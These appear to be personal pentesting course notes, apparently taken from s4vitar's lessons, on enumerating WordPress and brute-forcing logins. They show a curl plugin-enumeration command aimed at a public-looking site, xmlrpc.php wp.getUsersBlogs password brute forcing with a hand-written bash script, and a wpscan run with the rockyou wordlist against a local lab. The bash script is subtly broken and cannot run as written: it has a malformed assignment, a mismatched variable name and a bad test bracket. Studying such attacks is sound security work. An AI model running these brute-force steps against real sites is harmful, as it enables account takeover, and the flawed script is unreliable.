WE NORMALLY USE WHATWEB TO KNOW WHAT WE'RE DEALING WITH FIRST
#### WordPress
**Example with s4vitar's course**

To enumerate WordPress, we'll use **WPSCAN**  
Normally, for wpscan to report vulnerabilities from the APIs, we'll need to register in their app and copy our API token, which we'll add at the end of the command with `--api-token=`  
![[Pasted image 20251205114521.png]]  
![[Pasted image 20251205114604.png]]  
Usually, we can manually search for the APIs in the following path  
![[Pasted image 20251205114732.png]]  
but we can only see them if directory listing is enabled  

Sometimes, something can also be found in the source code  

We run `curl -s -X GET "https://sighore.es/" | grep -oP 'plugins/\K[^/]+'`  
![[Pasted image 20251205124532.png]]  

###### THIS IS THE MANUAL WAY  

We can try brute-forcing `xmlrpc.php` by creating a `file.xml` with these lines  
![[Pasted image 20251205124713.png]]  
We add this XML to the curl command with `-d@file.xml`  

`curl -s -X POST "https://localhost:31337/xmlrpc.php" -d@file.xml`  
![[Pasted image 20251205124921.png]]  
This will give us the available methods (which exist for everything). Specifically, we're looking for `wp.getUsersBlogs`, which allows us to enumerate credentials  
![[Pasted image 20251205125119.png]]  
Now we'll create another file to perform the brute force  
![[Pasted image 20251205125200.png]]  
In the `username` section, we'll need to either use a dictionary of users or, since we already know it, enter the username. In the `password` section, we'll use a bash script to perform brute force with a dictionary, a custom one if we've done OSINT, or an existing one like `rockyou`  

Let's create it  

- `nvim xmlrpc_bruteforce.sh`  
	```bash
	#!/bin/bash  
	function createXML(){  
	password $1  
	xmlfile="""  
	(paste the content of the previous XML here)  
	"""  
	echo $xmlFile > file.xml  
	response=$(curl -s -X POST "https://localhost:31337/xmlrpc.php" -d@file.xml)  
	if [ !"$(echo $response | grep 'Incorrect username or password.')"]; then  
		echo -e "\n The password for user s4vitar is $password"  
	fi  
	}  
	cat "path to the dictionary" | while read password; do  
	createXML $password  
	done  
	```  
![[Pasted image 20251205132118.png]]  

###### THE AUTOMATED WAY WITH WPSCAN  

`wpscan --url http://127.0.0.1:31337 -U s4vitar -P /usr/share/wordlists/rockyou.txt`  
![[Pasted image 20251205132354.png]]  
![[Pasted image 20251205132409.png]]


